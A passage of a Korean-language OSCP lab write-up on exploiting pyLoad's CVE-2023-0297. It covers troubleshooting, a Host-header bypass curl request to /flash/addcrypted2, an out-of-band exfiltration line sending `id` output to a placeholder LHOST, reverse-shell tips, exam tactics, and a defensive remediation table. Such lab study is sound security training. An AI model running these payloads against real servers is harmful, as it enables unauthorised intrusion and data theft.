| 명령은 도는 것 같은데 출력을 못 본다 | 이 CVE는 블라인드다 (응답 본문에 결과가 안 실린다) | 리버스셸로 가거나, `curl LHOST/$(id\|base64 -w0)` 같은 아웃오브밴드 채널로 결과를 빼낸다 |
| `pyimport` 가 안 먹는다 | `js2py.disable_pyimport()` 가 호출된 dev31 이상 | CVE-2024-39205(같은 엔드포인트, js2py 샌드박스 탈출)로 갈아탄다. `dev85` 이하면 여전히 뚫린다 |
| 리버스셸이 즉시 끊긴다 | `os.system()` 부모 프로세스 종료에 딸려 감 | `nohup`·`setsid` 로 분리하거나 `bash -c '... &'` |

> [!danger] `403 Forbidden` 이 이 익스플로잇의 유일한 진짜 관문이다
> `local_check` 의 조건은 `remote_addr in (...localhost...)` **또는** `http_host in ("127.0.0.1:9666", "[::1]:9666")` 이다. `or` 라는 것이 핵심이다.
> `HTTP_HOST` 는 클라이언트가 보낸 `Host:` 헤더이므로 전적으로 우리 통제 아래 있다. 프록시가 없어 `REMOTE_ADDR` 이 우리 IP로 남더라도 헤더 한 줄로 두 번째 가지를 만족시킬 수 있다:
> ```bash
> curl -s -X POST -H 'Host: 127.0.0.1:9666' --data-binary '<페이로드>' \
>   'http://TARGET:9666/flash/addcrypted2'
> ```
> 이 Host 헤더 우회는 CVE-2023-0297 시점에 고쳐지지 않았고, 벤더가 별도 어드바이저리(CVE-2024-39205)에서 인정한 뒤 2026-03에야 `"[CNL] add host header check"` 커밋으로 손봤다.
> 이 박스에서는 프록시 덕에 필요 없었지만, **다른 pyLoad 타겟에서 403을 만나면 이것이 첫 수다.**

### ⑦ 시간 배분 — 실측과 권장 예산

정찰 시작(10:45:55) → root 셸(11:11:00 이전), 실측 약 25분이다.

| 단계 | 이 박스 실측 | 권장 예산 | 초과 시 판단 |
|---|---|---|---|
| nmap 전수 스캔 | 54초 (10:45:55→10:46:49) | 5분 | `--min-rate` 를 확인 |
| 서비스 식별 + 기본 자격증명 + 정보 페이지 | ~21분 (10:46→11:08) | 15분 | ★ 이 박스에서 가장 긴 구간이다. 기본 자격증명 3~4개가 안 통하면 즉시 pre-auth 익스플로잇 탐색으로 전환한다. 브루트포스는 최후 수단 |
| 익스플로잇 확보 (`git clone`) | 1초 미만 (11:08:04) | 10분 | 공개 익스플로잇이 없으면 CVE 설명만으로 `curl` 을 손으로 조립한다 |
| 실행 → root 셸 → 플래그 | ~3분 (11:08→11:11) | 10분 | 안 붙으면 ③의 5단계 점검 |
| 권한상승 | 0분 | — | 정보 페이지에서 이미 root임을 알았다 |
| (사후) `searchsploit -m 51532` | 11:12:16 | — | root를 잡은 뒤의 참고 행위다. 시간 예산에 넣지 않는다 |

9666은 `nmap-services` 등재 포트이고 top-1000 안이다(1-1). 이 박스는 `-p-` 없이도 풀렸을 것이고, 시간이 샐 수 있었던 지점은 오히려 **로그인 화면을 보고 인증부터 뚫으려 든 것**(②)이었다. 그래도 `-p-` 는 넣는다. 근거는 미등재 고번호 포트다 — [[Hawat]]의 50080(cloud 로그인 패널)은 기본 스캔에 잡히지 않았고 그 포트가 박스의 유일한 경로였다. 시간이 급하면 `--min-rate` 를 올리지 포트 범위를 줄이지 않는다.

---

## 7. OSCP 시험 관점

이 상황을 다시 만나면 무엇부터 치는가, 순서대로.

1. `-p-` 전수 스캔부터 — `sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log <IP>`. 단 이 박스가 그 근거는 아니다. 9666은 top-1000 안이다(1-1). 근거는 [[Hawat]]의 50080 같은 미등재 고번호다. **포트 범위를 줄이는 것은 시간 절약이 아니라 박스를 버릴 위험을 사는 것이다.**
2. 비표준 포트의 HTTP를 보면 `http-title` 과 `Server` 헤더 두 줄부터 읽는다. `Login - pyLoad` + `Cheroot/8.6.0` 이 제품명과 파이썬 앱이라는 사실을 동시에 알려줬다. 제품명이 나오면 그게 검색 키워드다.
3. 제품명을 얻으면 `searchsploit <제품> | grep -i "pre-auth\|unauth"` 를 먼저 친다. 인증 없이 되는 게 있으면 로그인 시도 자체가 불필요하다. 이 박스가 그랬다.
4. 기본 자격증명은 그 다음이다. `제품명 default credentials` 검색. 통하면 버전과 실행 경로를 얻는 것이 목적이지 로그인 자체가 목표가 아니다.
5. **관리 화면에서 경로가 보이면 실행 계정을 판정한다.** `/root/*` 면 root, `/home/x/*` 면 x, `/var/www` 면 www-data. 권한상승 단계가 있는지 없는지가 여기서 결정된다.
6. **남의 익스플로잇은 실행 전에 읽는다.** 최소한 (a) 어디로 요청을 보내는지, (b) 성공 판정을 어떻게 하는지, (c) 아웃바운드 연결을 요구하는지. `51532.py` 는 (b)가 아예 없는 블라인드 스크립트였다.
7. 자동 도구 관점에서 이 박스는 시험 규정상 안전하다. `sqlmap`(명시적 금지)을 쓰지 않았고 Metasploit(1대 한정)도 쓰지 않았다. `searchsploit` 은 검색 도구라 제한 대상이 아니고, `CVE-2023-0297.sh` 도 배너를 뺀 실체는 `curl` 한 줄이라(3-3) 자동 익스플로잇 프레임워크와 무관하다.
8. 그래도 `curl` 원라이너를 손에 쥐고 있는다. 남의 스크립트는 파이썬 버전·의존성·인자 파싱에서 흔히 깨진다. 3-3의 한 줄이면 스크립트 없이 끝난다.
9. **HTTP 파라미터에 셸 페이로드를 넣을 때는 `&` 를 `%26` 으로 바꾼다.** `>&`·`2>&1`·`0>&1` 이 전부 `&` 를 포함한다. 놓치면 200이 돌아오는데 셸은 안 붙는 최악의 디버깅 상황이 된다.
10. `--data-urlencode` 와 `--data-binary` 를 혼동하지 않는다. 페이로드가 이미 인코딩돼 있으면 `--data-binary`, raw 문자열이면 `--data-urlencode` 다. 섞으면 이중 인코딩으로 조용히 실패한다.
11. `os.system()` 은 `/bin/sh` 로 실행된다. Ubuntu/Debian 의 `/bin/sh` 는 dash 이고 dash 에는 `/dev/tcp` 가 없으므로 `bash -c '...'` 로 감싼다. `python3`·`perl`·`nc mkfifo` 대안도 함께 외워둔다.
12. 파이썬 앱을 뚫었으면 파이썬 리버스셸이 1순위다. `pyimport os` 로 이미 파이썬 안에 있으므로 `pty.spawn()` 까지 써서 TTY 있는 셸을 한 방에 얻을 수 있었다.
13. nmap 의 OS 추측을 서비스 배너보다 우선하지 않는다. `MikroTik RouterOS` 는 틀렸고 `OpenSSH 8.9p1 Ubuntu 3ubuntu0.1` 이 맞았다. 패키지 리비전 접미사가 배포판을 확정한다.
14. 애플리케이션이 말한 포트가 아니라 nmap 이 본 포트를 쓴다. `WebUI Port: 8000` ↔ 실제 9666.
15. **샌드박스를 방어로 세지 않는다.** js2py 의 `pyimport`, Jinja2 의 `__class__`, Node `vm` 의 `constructor.constructor` — 상호운용 기능이 있는 샌드박스는 샌드박스가 아니다. 템플릿/스크립트 엔진에 사용자 문자열이 들어가는 것을 보면 RCE 를 전제하고 접근한다.
16. 인증 예외 목록을 노린다. 앱 전체가 로그인 뒤에 있어 보여도 헬스체크·웹훅·콜백·프로토콜 어댑터(`/flash/*`)는 열려 있는 경우가 많다. 로그인 화면이 뜬다고 전부 막혀 있는 것이 아니다.
17. 출발지 IP 기반 접근제어를 보면 그 IP를 바꿔줄 중간 홉을 찾는다. 이 박스는 앱이 스스로 프록시(`ClickNLoad`, `extern=True`)를 켜서 `REMOTE_ADDR` 을 `127.0.0.1` 로 만들어줬다. 리버스 프록시·로드밸런서·SSRF 가 전부 같은 효과를 낸다.
18. `403 Forbidden` 을 막혔다고 읽지 말고 조건문을 읽는다. `local_check` 는 `REMOTE_ADDR` 또는 `HTTP_HOST` 를 보는데, 후자는 클라이언트가 정하는 값이므로 `-H 'Host: 127.0.0.1:9666'` 한 줄로 통과한다. **`or` 로 묶인 접근제어는 가장 약한 가지만큼만 강하다.**
19. CVE 가 패치됐다는 문장과 이 엔드포인트가 안전하다는 문장은 다르다. CVE-2023-0297 패치는 `disable_pyimport()` 한 줄이었고 같은 진입점에서 CVE-2024-39205 가 곧바로 나왔다. 취약했던 엔드포인트의 후속 CVE 를 항상 확인한다.
20. root 를 잡으면 `/root/` 전체를 훑는다. `email5.txt` 같은 파일이 다음 박스의 자격증명일 수 있다.
21. 증거 스크린샷은 `whoami; hostname; ip a; cat /root/proof.txt` 한 줄로. TTY 없는 셸에서는 나눠 치면 한 화면에 안 담긴다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| pyLoad `< 0.5.0b3.dev31` 방치 (CVE-2023-0297) | `0.5.0b3.dev31` 이상으로 업그레이드. 다만 그것만으로는 부족하다 — 같은 엔드포인트의 CVE-2024-39205(`<= dev85`)까지 넘겨야 하고, 근본 해결은 js2py를 걷어낸 2025-08 이후 판본이다 |
| ★ `ClickNLoad` 애드온의 `extern = True` | **가장 값싼 조치다.** `extern` 을 `False` 로 내리면 9666이 `127.0.0.1` 에만 바인드되고 원격에서는 `local_check` 에 막힌다. Click'n'Load 를 안 쓴다면 애드온 `enabled` 를 아예 `False` 로 |
| `local_check` 가 `REMOTE_ADDR`·`HTTP_HOST` 를 신뢰 | 출발지 IP는 프록시 한 겹이면 무너지고 `Host` 헤더는 클라이언트가 정한다. 접근제어를 네트워크 계층(바인드 주소·방화벽)으로 옮기거나 실제 인증 토큰을 쓴다 |
| `/flash/*` 가 인증 예외 + 경로 프리픽스 면제 + 와일드카드 CORS | Click'n'Load 가 필요 없으면 엔드포인트 자체를 비활성화한다. `url_prefix="/"` 때문에 웹UI를 하위 경로로 옮겨 숨겨도 소용없다 |
| `js2py` 에 클라이언트 입력을 그대로 평가 | `js2py.disable_pyimport()` 호출은 최소선이자 불충분선이다(CVE-2024-39205가 증명). 근본적으로는 CNL 키 추출을 정규식 파싱으로 대체해 임의 코드 평가를 없애야 한다 |
| 웹UI를 `0.0.0.0` 로 바인드 | 관리 UI는 루프백 바인드 + SSH 터널 또는 VPN 뒤에 둔다. 로컬에서만 온다는 가정을 바인드 주소로 강제한다 |
| pyLoad 가 root 로 실행 | ★ 가장 값싸고 효과가 큰 조치다. 전용 계정(`pyload`)으로 systemd 유닛 등록 — `User=pyload`, `ProtectSystem=strict`, `PrivateTmp=yes`, `NoNewPrivileges=yes`. **이것 하나로 RCE 가 root 침해가 아니라 서비스 계정 침해로 격하된다** |
| 기본 자격증명 `pyload/pyload` 방치 | 최초 기동 시 비밀번호 변경 강제. 이 CVE와 무관하게 관리 UI 전권을 그냥 내주는 문제다 |
| 아웃바운드 무제한 | 서버에서 나가는 연결을 화이트리스트로 제한하면 리버스셸이 막힌다. egress filtering 은 RCE 의 피해를 크게 줄인다 |
| 탐지 부재 | `/flash/addcrypted2` 로의 외부 IP발 POST 는 정상 트래픽이 아니다. WAF/IDS 규칙 한 줄로 잡힌다 |

---

## 9. 참고 자료

1차 사료 — 이 노트의 2장은 전부 아래에서 직접 확인했다. 블로그 요약은 근거로 쓰지 않았다.

- CVE-2023-0297 — NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-0297 (CVSS 9.8, CWE-94)
- GHSA-pf38-5p22-x6h6 — https://github.com/advisories/GHSA-pf38-5p22-x6h6 · `pyload-ng < 0.5.0b3.dev31`, 최초 패치 `0.5.0b3.dev31`
- 패치 커밋 `7d73ba7919e594d783b3411d7ddb87885aea782d` — *"fix arbitrary python code execution by abusing js2py functionality"* (2023-01-03, `src/pyload/core/utils/misc.py` 한 줄)
- 취약 코드 원문 `src/pyload/webui/app/blueprints/cnl_blueprint.py` @ `6aa71cd99a6f510de7137d17ec99f930916704c0` — `local_check` 데코레이터와 `eval_js(f"{jk} f()")`
- `ClickNLoad` 애드온 원문 `src/pyload/plugins/addons/ClickNLoad.py` @ 같은 커밋 — `extern` 기본값 `True`, 포트 9666, 원시 TCP 포워딩
- pyLoad 기본 설정 `src/pyload/core/config/default.cfg` — `int port : "Port" = 8000` (웹UI 기본 포트)
- `js2py` — `translators/translating_nodes.py` 의 `PyimportStatement()`, `evaljs.py` 의 `disable_pyimport()`: https://github.com/PiotrDabkowski/Js2Py
- 후속 취약점 GHSA-r9pp-r4xf-597r / CVE-2024-39205 — 같은 `/flash/addcrypted2`, `pyload-ng <= 0.5.0b3.dev85`. Host 헤더 우회를 벤더가 명시적으로 인정한 문서
- js2py 완전 제거 커밋 `aa9300fb4e52` (2025-08-20) *"remove js2py and dukpy in favour of mini-racer"*

도구·익스플로잇

- 공개 익스플로잇 (실제로 사용): https://github.com/overgrowncarrot1/CVE-2023-0297
- exploit-db 51532 (받았으나 미사용): https://www.exploit-db.com/exploits/51532
- `/dev/tcp` 리버스셸 및 대안: PayloadsAllTheThings — Reverse Shell Cheatsheet

## 남긴 흔적 (랩 정리용)

- 타겟에 파일을 떨어뜨리지 않았다. 페이로드가 `bash -i` 원라이너라 디스크에 남는 것이 없다.
- 남는 것은 프로세스와 로그뿐이다 — pyLoad 로그에 `/flash/addcrypted2` POST 기록, `bash` 자식 프로세스. 리버스셸을 끊으면 정리된다.
- 획득 자격증명: pyLoad 웹UI `pyload` / `pyload` (기본값).
- 미열람 파일: `/root/email5.txt` (존재만 확인).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[plum]] — 같은 날 푼 박스. 웹앱 기본 자격증명(`admin/admin`) → 인증 후 RCE. pyLoader 가 pre-auth 라 로그인이 불필요했던 것과 대비된다
- [[Squid]] — 관리 화면이 설치 경로를 유출해 다음 수를 결정해준 같은 패턴 (`phpinfo` → `C:\wamp\`). 설정값과 실제가 어긋나는 함정(MariaDB 3307)도 동일
- [[Codo]] — nmap OS 추측을 버리고 서비스 배너의 패키지 리비전으로 배포판을 확정하는 규칙. TTY 없는 셸의 한계
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — 누적 패턴 "응답이 성공을 뜻하지 않는다". 이 박스에서는 `51532.py` 의 무조건 성공 메시지가 같은 계열
- [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개"
